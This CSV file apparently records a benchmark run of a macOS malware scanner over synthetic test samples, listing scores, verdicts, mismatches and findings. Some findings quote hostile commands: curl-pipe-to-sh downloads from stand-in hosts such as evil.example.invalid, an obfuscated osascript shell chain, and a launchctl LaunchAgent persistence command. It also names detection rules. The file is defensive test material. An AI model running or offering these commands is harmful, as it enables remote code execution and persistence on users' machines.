run_id,sample_id,group,subtype,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,findings
"2026-03-08T10-11-22Z-441932","replay_malicious_app_bash_curl_persist_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_app_bash_curl_persist_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.243Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_app_osascript_chain_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_app_osascript_chain_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.244Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_chain_01","replay_malicious","replay_json","replay/malicious/replay_malicious_chain_01.json","jsonReplay","100","malicious","malicious","85","100","true","true","","completed","0","2026-03-08T10:11:33.244Z","true","","Replay evaluation: malicious (score 100)","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-08T10-11-22Z-441932","replay_malicious_pkg_postinstall_multiegres_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_pkg_postinstall_multiegres_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.245Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_python_subprocess_priv_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_python_subprocess_priv_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.245Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_app_shell_egress_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_app_shell_egress_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.245Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_persistence_attempt_01","replay_suspicious","replay_json","replay/suspicious/replay_suspicious_persistence_attempt_01.json","jsonReplay","50","suspicious","suspicious","60","80","true","false","score_too_low","completed","0","2026-03-08T10:11:33.246Z","true","","Replay evaluation: suspicious (score 50)","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-08T10-11-22Z-441932","replay_suspicious_pkg_persistence_mirror_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_pkg_persistence_mirror_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.246Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_python_decode_plist_mirror_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_python_decode_plist_mirror_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.246Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_shell_fanout_tmp_egress_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_shell_fanout_tmp_egress_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.246Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","suspicious_applescript_auth_lure_prompt_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_auth_lure_prompt_02.applescript","appleScript","0","clean","suspicious","35","52","false","false","verdict_too_low","completed","182","2026-03-08T10:11:33.429Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_applescript_doshell_echo_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_doshell_echo_02.applescript","appleScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","176","2026-03-08T10:11:33.606Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.do_shell_script] AppleScript 调用 shell [high] L2-2 Δ20: do shell script ""echo '[dry-run] would run: "" & suspiciousCmd & ""'"" | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_applescript_keystroke_sim_01","suspicious","applescript","suspicious/applescript/suspicious_applescript_keystroke_sim_01.applescript","appleScript","0","clean","suspicious","58","78","false","false","verdict_too_low","completed","176","2026-03-08T10:11:33.782Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_applescript_system_settings_text_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_system_settings_text_02.applescript","appleScript","0","clean","suspicious","35","50","false","false","verdict_too_low","completed","176","2026-03-08T10:11:33.959Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_applescript_terminal_download_print_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_terminal_download_print_02.applescript","appleScript","0","clean","suspicious","52","70","false","false","verdict_too_low","completed","178","2026-03-08T10:11:34.137Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_app_bundle_fixture_02","suspicious","hybrid_app","suspicious/hybrid/SyntheticSuspiciousFixture_02.app","appBundle","10","clean","suspicious","60","78","false","false","verdict_too_low","completed","2236","2026-03-08T10:11:36.374Z","true","","该样本样本可执行但未签名，来源可信度不足。。综合评分 10/100，判定 Clean（低风险）。","未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_chain_sim_01","suspicious","hybrid","suspicious/hybrid/suspicious_hybrid_chain_sim_01.json","appleScript","0","clean","suspicious","65","88","false","false","verdict_too_low","completed","181","2026-03-08T10:11:36.555Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.do_shell_script] AppleScript 调用 shell [high] L18-18 Δ20: ""payload"": ""do shell script 'osascript -e ...'"" | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_dmg_mirror_fixture_02","suspicious","hybrid_dmg","suspicious/hybrid/suspicious_hybrid_dmg_mirror_fixture_02","machO","10","clean","malicious","70","80","false","false","verdict_too_low","completed","781","2026-03-08T10:11:37.336Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","Executable file | No dedicated analyzer for machO. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_pkg_fixture_02","suspicious","hybrid_pkg","suspicious/hybrid/suspicious_hybrid_pkg_fixture_02","machO","10","clean","malicious","68","80","false","false","verdict_too_low","completed","764","2026-03-08T10:11:38.101Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","Executable file | No dedicated analyzer for machO. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","suspicious_js_buffer_obfuscation_sim_02","suspicious","js","suspicious/js/suspicious_js_buffer_obfuscation_sim_02.js","javaScript","25","clean","suspicious","55","74","false","false","verdict_too_low","completed","178","2026-03-08T10:11:38.280Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(payload, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
"2026-03-08T10-11-22Z-441932","suspicious_js_child_process_echo_chain_02","suspicious","js","suspicious/js/suspicious_js_child_process_echo_chain_02.js","javaScript","10","clean","suspicious","55","72","false","false","verdict_too_low","completed","181","2026-03-08T10:11:38.461Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_js_download_execute_sim_02","suspicious","js","suspicious/js/suspicious_js_download_execute_sim_02.js","javaScript","45","suspicious","suspicious","60","78","true","false","score_too_low","completed","176","2026-03-08T10:11:38.638Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45/100，判定 Suspicious（可疑）。","检测到远程下载执行链 | 检测到混淆或编码逃逸 | [javascript.network_download_exec] 网络下载并执行链 [critical] L11-11 Δ34: https.get('https://example.com/', (res) => { | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_js_eval_decode_message_02","suspicious","js","suspicious/js/suspicious_js_eval_decode_message_02.js","javaScript","25","clean","suspicious","58","76","false","false","verdict_too_low","completed","176","2026-03-08T10:11:38.814Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L4-4 Δ22: const value = eval(decoded); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""'synthetic harmless eval message'"", 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_js_obfuscation_sim_01","suspicious","js","suspicious/js/suspicious_js_obfuscation_sim_01.js","javaScript","25","clean","suspicious","60","80","false","false","verdict_too_low","completed","175","2026-03-08T10:11:38.990Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [javascript.osascript_shell_chain] JavaScript 调用 osascript/shell [high] L2-2 Δ24: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, ""base64"").toString(""utf8""); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_python_download_would_execute_02","suspicious","python","suspicious/python/suspicious_python_download_would_execute_02.py","pythonScript","10","clean","suspicious","55","72","false","false","verdict_too_low","completed","176","2026-03-08T10:11:39.166Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_python_downloader_sim_01","suspicious","python","suspicious/python/suspicious_python_downloader_sim_01.py","pythonScript","60","malicious","suspicious","62","82","false","false","verdict_too_high","completed","176","2026-03-08T10:11:39.342Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 60/100，判定 Malicious（高风险）。","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(b""curl -L https://evil.example.invalid/payload.sh | sh"").decode(""ascii"") | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L10-10 Δ14: decoded = base64.b64decode(encoded).decode(""utf-8"")"
"2026-03-08T10-11-22Z-441932","suspicious_python_echo_chain_02","suspicious","python","suspicious/python/suspicious_python_echo_chain_02.py","pythonScript","10","clean","suspicious","52","68","false","false","verdict_too_low","completed","176","2026-03-08T10:11:39.519Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [python.os_system] os.system 命令执行 [high] L6-6 Δ20: os.system(f'echo ""[dry-run][os.system] would run: {chain}""') | [python.subprocess_exec] subprocess 外部进程执行 [high] L7-7 Δ20: subprocess.run([""echo"", ""[dry-run][subprocess] would invoke staged shell chain""], check=True) | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_python_launchagent_mirror_02","suspicious","python","suspicious/python/suspicious_python_launchagent_mirror_02.py","pythonScript","10","clean","suspicious","52","68","false","false","verdict_too_low","completed","178","2026-03-08T10:11:39.697Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_python_obfuscation_restore_02","suspicious","python","suspicious/python/suspicious_python_obfuscation_restore_02.py","pythonScript","25","clean","suspicious","58","76","false","false","verdict_too_low","completed","177","2026-03-08T10:11:39.875Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L3-3 Δ14: import marshal | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L4-4 Δ14: import zlib | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L7-7 Δ14: packed = marshal.dumps({""msg"": harmless}) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L8-8 Δ14: compressed = zlib.compress(packed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(compressed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L11-11 Δ14: restored = marshal.loads(zlib.decompress(base64.b64decode(encoded)))"
"2026-03-08T10-11-22Z-441932","suspicious_python_reverse_shell_string_02","suspicious","python","suspicious/python/suspicious_python_reverse_shell_string_02.py","pythonScript","10","clean","suspicious","60","78","false","false","verdict_too_low","completed","175","2026-03-08T10:11:40.051Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_python_socket_metadata_sim_02","suspicious","python","suspicious/python/suspicious_python_socket_metadata_sim_02.py","pythonScript","10","clean","suspicious","40","58","false","false","verdict_too_low","completed","176","2026-03-08T10:11:40.227Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_shell_base64_decode_print_02","suspicious","shell","suspicious/shell/suspicious_shell_base64_decode_print_02.sh","shellScript","10","clean","suspicious","55","72","false","false","verdict_too_low","completed","178","2026-03-08T10:11:40.406Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_shell_download_exec_string_02","suspicious","shell","suspicious/shell/suspicious_shell_download_exec_string_02.sh","shellScript","45","suspicious","suspicious","60","75","true","false","score_too_low","completed","176","2026-03-08T10:11:40.583Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45/100，判定 Suspicious（可疑）。","检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: CHAIN_CMD='curl -fsSL https://example.com/install.sh | sh' | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_shell_launchagent_mirror_02","suspicious","shell","suspicious/shell/suspicious_shell_launchagent_mirror_02.sh","shellScript","10","clean","suspicious","58","72","false","false","verdict_too_low","completed","179","2026-03-08T10:11:40.763Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到持久化行为 | [shell.launchctl.persistence] launchctl 持久化操作 [high] L22-22 Δ20: echo ""[dry-run] launchctl load NOT invoked"" | Script persistence behavior detected. | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_shell_mktemp_chain_sim_02","suspicious","shell","suspicious/shell/suspicious_shell_mktemp_chain_sim_02.sh","shellScript","10","clean","suspicious","60","78","false","false","verdict_too_low","completed","176","2026-03-08T10:11:40.939Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_shell_multistage_chain_note_02","suspicious","shell","suspicious/shell/suspicious_shell_multistage_chain_note_02.sh","shellScript","10","clean","suspicious","62","80","false","false","verdict_too_low","completed","176","2026-03-08T10:11:41.116Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_shell_persistence_sim_01","suspicious","shell","suspicious/shell/suspicious_shell_persistence_sim_01.sh","shellScript","10","clean","suspicious","60","80","false","false","verdict_too_low","completed","176","2026-03-08T10:11:41.293Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到持久化行为 | [shell.write_launchagent] 写入 LaunchAgents/LaunchDaemons [critical] L8-8 Δ32: PERSIST_CMD='launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.fake.agent.plist' | [shell.launchctl.persistence] launchctl 持久化操作 [high] L8-8 Δ20: PERSIST_CMD='launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.fake.agent.plist' | Script persistence behavior detected. | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_shell_profile_mirror_02","suspicious","shell","suspicious/shell/suspicious_shell_profile_mirror_02.sh","shellScript","10","clean","suspicious","50","68","false","false","verdict_too_low","completed","178","2026-03-08T10:11:41.471Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"